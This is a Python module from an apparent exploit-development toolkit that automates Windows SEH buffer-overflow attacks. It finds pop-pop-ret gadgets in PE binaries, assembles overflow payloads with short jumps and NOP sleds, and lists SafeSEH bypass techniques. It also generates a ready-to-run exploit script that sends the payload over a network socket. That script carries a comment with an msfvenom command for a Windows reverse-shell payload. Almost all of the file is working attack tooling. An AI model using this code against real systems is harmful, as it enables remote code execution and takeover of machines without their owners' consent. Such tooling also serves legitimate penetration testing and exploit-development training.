"""
Windows SEH (Structured Exception Handling) exploitation.

SEH is Windows' exception handling mechanism that can be exploited
when stack-based buffer overflows corrupt exception handler pointers.

Key concepts:
- SEH chain: Linked list of exception handlers on stack
- nSEH: Next SEH pointer (points to next record)
- Handler: Pointer to exception handler function
- SafeSEH: Protection that validates handlers against a list
- SEHOP: SEH Overwrite Protection (validates chain integrity)

Classic SEH exploitation:
1. Overflow to overwrite nSEH and Handler
2. Handler points to "pop pop ret" gadget
3. nSEH contains short jump over Handler
4. Exception triggered, handler called
5. pop pop ret returns to nSEH
6. Short jump lands in shellcode
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class SEHRecord:
    """SEH record structure."""
    address: int           # Address of this record on stack
    next_seh: int          # Pointer to next SEH record
    handler: int           # Pointer to exception handler
    is_final: bool = False  # True if next_seh is 0xFFFFFFFF


@dataclass
class SEHGadget:
    """Pop-pop-ret gadget for SEH exploitation."""
    address: int
    instructions: str
    module: str = ""
    safe_seh_protected: bool = False
    aslr_module: bool = False


@dataclass
class SEHChain:
    """Complete SEH exploit chain."""
    padding: bytes           # Padding to reach SEH
    nseh_value: bytes        # Value for nSEH (usually short jump)
    handler_value: bytes     # Handler address (pop pop ret)
    shellcode: bytes         # Shellcode after handler
    total_payload: bytes = field(default=b"")

    def build(self) -> bytes:
        """Build complete payload."""
        payload = self.padding + self.nseh_value + self.handler_value + self.shellcode
        self.total_payload = payload
        return payload


@dataclass
class SafeSEHBypass:
    """SafeSEH bypass technique."""
    technique: str
    requirements: List[str] = field(default_factory=list)
    gadget: Optional[SEHGadget] = None
    description: str = ""


class SEHExploit:
    """
    SEH exploitation techniques.

    Example:
        pe = PEBinary("vulnerable.exe")
        seh = SEHExploit(pe)

        # Find pop-pop-ret gadgets
        gadgets = seh.find_pop_pop_ret()

        # Build SEH exploit
        chain = seh.build_seh_chain(
            offset=1024,
            gadget=gadgets[0],
            shellcode=shellcode
        )

        payload = chain.build()
    """

    # Short jump opcodes
    SHORT_JMP_FORWARD = b"\xeb\x06"   # jmp short $+8 (over handler + 2 bytes)
    SHORT_JMP_BACK = b"\xeb\xf9"     # jmp short $-5

    # nSEH placeholder for SEHOP bypass
    FINAL_SEH = 0xFFFFFFFF

    def __init__(self, pe_binary: Any):
        """
        Initialize SEH exploit.

        Args:
            pe_binary: PEBinary instance
        """
        self.pe = pe_binary
        self.bits = pe_binary.bits

        if self.bits != 32:
            logger.warning("SEH exploitation is primarily for 32-bit Windows")

    def find_pop_pop_ret(
        self,
        avoid_bad_chars: bytes = b"\x00",
        require_non_safeseh: bool = True
    ) -> List[SEHGadget]:
        """
        Find pop-pop-ret gadgets for SEH exploitation.

        Args:
            avoid_bad_chars: Characters to avoid in addresses
            require_non_safeseh: Only return gadgets from non-SafeSEH modules

        Returns:
            List of usable pop-pop-ret gadgets
        """
        gadgets = []

        try:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_32

            md = Cs(CS_ARCH_X86, CS_MODE_32)

            # Search executable sections
            for section in self.pe.sections:
                if not section.executable:
                    continue

                data = self.pe.read_bytes(section.virtual_address, section.virtual_size)

                # Find ret (0xc3) and work backwards
                for i in range(len(data)):
                    if data[i] != 0xc3:
                        continue

                    # Check for pop-pop-ret patterns
                    for start in range(max(0, i - 6), i):
                        chunk = data[start:i + 1]
                        if len(chunk) < 3:
                            continue

                        insns = list(md.disasm(chunk, 0))

                        if len(insns) >= 3:
                            # Check for pop, pop, ret
                            if (insns[-1].mnemonic == 'ret' and
                                insns[-2].mnemonic == 'pop' and
                                insns[-3].mnemonic == 'pop'):

                                addr = self.pe.image_base + section.virtual_address + start

                                # Check bad chars
                                addr_bytes = addr.to_bytes(4, 'little')
                                if any(b in addr_bytes for b in avoid_bad_chars):
                                    continue

                                disasm = "; ".join(
                                    f"{ins.mnemonic} {ins.op_str}".strip()
                                    for ins in insns[-3:]
                                )

                                gadget = SEHGadget(
                                    address=addr,
                                    instructions=disasm,
                                    safe_seh_protected=self.pe.protections.safe_seh,
                                    aslr_module=self.pe.protections.aslr_enabled,
                                )
                                gadgets.append(gadget)

        except ImportError:
            logger.warning("Capstone not available for gadget search")
        except Exception as e:
            logger.debug(f"Error finding gadgets: {e}")

        # Filter SafeSEH if requested
        if require_non_safeseh:
            gadgets = [g for g in gadgets if not g.safe_seh_protected]

        logger.info(f"Found {len(gadgets)} pop-pop-ret gadgets")
        return gadgets

    def build_seh_chain(
        self,
        offset: int,
        gadget: SEHGadget,
        shellcode: bytes,
        jump_offset: int = 6
    ) -> SEHChain:
        """
        Build SEH exploitation chain.

        Args:
            offset: Offset from buffer start to nSEH
            gadget: Pop-pop-ret gadget to use
            shellcode: Shellcode to execute
            jump_offset: Jump distance over handler (default 6)

        Returns:
            SEHChain with complete payload
        """
        # Build short jump for nSEH
        nseh = bytes([0xeb, jump_offset & 0xff])  # jmp short
        nseh += b"\x90\x90"  # NOP padding to fill 4 bytes

        # Handler address
        handler = gadget.address.to_bytes(4, 'little')

        chain = SEHChain(
            padding=b"A" * offset,
            nseh_value=nseh,
            handler_value=handler,
            shellcode=b"\x90" * 8 + shellcode,  # NOP sled before shellcode
        )

        return chain

    def get_safeseh_bypasses(self) -> List[SafeSEHBypass]:
        """
        Get SafeSEH bypass techniques for this binary.

        Returns:
            List of applicable SafeSEH bypass techniques
        """
        bypasses = []

        # Non-SafeSEH module
        if not self.pe.protections.safe_seh:
            bypasses.append(SafeSEHBypass(
                technique="Non-SafeSEH Module",
                requirements=["Binary not compiled with SafeSEH"],
                description="Use pop-pop-ret from this module directly"
            ))

        # DEP disabled
        if not self.pe.protections.dep_enabled:
            bypasses.append(SafeSEHBypass(
                technique="Stack Pivot + Shellcode",
                requirements=["DEP disabled", "Executable stack"],
                description="Pivot stack to shellcode location"
            ))

        # ASLR disabled
        if not self.pe.protections.aslr_enabled:
            bypasses.append(SafeSEHBypass(
                technique="Fixed Address Gadgets",
                requirements=["ASLR disabled"],
                description="Use gadgets at predictable addresses"
            ))

        # Heap spray
        bypasses.append(SafeSEHBypass(
            technique="Heap Spray",
            requirements=["Controllable heap allocations"],
            description="Spray heap with shellcode, use heap address as handler"
        ))

        # Partial overwrite
        bypasses.append(SafeSEHBypass(
            technique="Partial Overwrite",
            requirements=["Ability to do partial overwrite"],
            description="Overwrite only lower bytes to reach valid handler"
        ))

        return bypasses

    def analyze_seh_chain(self, stack_dump: bytes, stack_base: int) -> List[SEHRecord]:
        """
        Analyze SEH chain from stack dump.

        Args:
            stack_dump: Bytes from stack memory
            stack_base: Base address of stack dump

        Returns:
            List of SEH records found
        """
        records = []

        # SEH records are 8 bytes: next_seh (4) + handler (4)
        # Follow the chain
        # In real scenario, we'd need TEB to find FS:[0] (SEH head)

        # Parse potential SEH records
        for i in range(0, len(stack_dump) - 8, 4):
            next_seh = int.from_bytes(stack_dump[i:i+4], 'little')
            handler = int.from_bytes(stack_dump[i+4:i+8], 'little')

            # Heuristic: valid SEH record
            if (0x10000 < handler < 0x7FFFFFFF and  # Reasonable handler address
                (next_seh == 0xFFFFFFFF or 0x10000 < next_seh < 0x7FFFFFFF)):

                record = SEHRecord(
                    address=stack_base + i,
                    next_seh=next_seh,
                    handler=handler,
                    is_final=(next_seh == 0xFFFFFFFF)
                )
                records.append(record)

        return records

    def generate_exploit_template(
        self,
        offset: int,
        gadget: Optional[SEHGadget] = None
    ) -> str:
        """
        Generate Python exploit template.

        Args:
            offset: Offset to SEH
            gadget: Pop-pop-ret gadget (optional)

        Returns:
            Python exploit script
        """
        gadget_addr = hex(gadget.address) if gadget else "0x41414141"
        gadget_comment = gadget.instructions if gadget else "pop pop ret"

        template = f'''#!/usr/bin/env python3
"""
SEH Overflow Exploit Template
Generated by supwngo

Target: {self.pe.path.name}
Offset to SEH: {offset}
"""

import struct
import socket
import sys

# Target info
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9999

# Gadget: {gadget_comment}
POP_POP_RET = {gadget_addr}

# Shellcode placeholder - replace with your shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -b "\\x00" -f python
SHELLCODE = b""
SHELLCODE += b"\\xcc" * 100  # INT3 placeholder

def create_payload():
    """Create SEH overflow payload."""
    payload = b""

    # Padding to SEH
    payload += b"A" * {offset}

    # nSEH - short jump over handler
    # \\xeb\\x06 = jmp short $+8
    payload += b"\\xeb\\x06\\x90\\x90"

    # SEH Handler - pop pop ret gadget
    payload += struct.pack("<I", POP_POP_RET)

    # NOP sled + shellcode
    payload += b"\\x90" * 16
    payload += SHELLCODE

    return payload

def exploit():
    """Send exploit payload."""
    payload = create_payload()
    print(f"[*] Payload size: {{len(payload)}} bytes")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_HOST, TARGET_PORT))

        print(f"[*] Sending payload to {{TARGET_HOST}}:{{TARGET_PORT}}")
        s.send(payload)

        s.close()
        print("[+] Payload sent!")

    except Exception as e:
        print(f"[-] Error: {{e}}")
        sys.exit(1)

if __name__ == "__main__":
    exploit()
'''
        return template

    def summary(self) -> str:
        """Get SEH exploitation summary."""
        gadgets = self.find_pop_pop_ret()
        bypasses = self.get_safeseh_bypasses()

        lines = [
            "SEH Exploitation Analysis",
            "=" * 40,
            f"Binary: {self.pe.path.name}",
            f"SafeSEH: {self.pe.protections.safe_seh}",
            f"SEHOP: {self.pe.protections.seh_no_handler}",
            f"DEP: {self.pe.protections.dep_enabled}",
            f"ASLR: {self.pe.protections.aslr_enabled}",
            "",
            f"Pop-Pop-Ret gadgets: {len(gadgets)}",
        ]

        for g in gadgets[:5]:
            lines.append(f"  {hex(g.address)}: {g.instructions}")

        lines.append("")
        lines.append(f"Bypass techniques: {len(bypasses)}")
        for b in bypasses:
            lines.append(f"  - {b.technique}")

        return "\n".join(lines)


def find_seh_gadgets(pe_binary: Any) -> List[SEHGadget]:
    """
    Convenience function to find SEH gadgets.

    Args:
        pe_binary: PEBinary instance

    Returns:
        List of pop-pop-ret gadgets
    """
    exploit = SEHExploit(pe_binary)
    return exploit.find_pop_pop_ret()
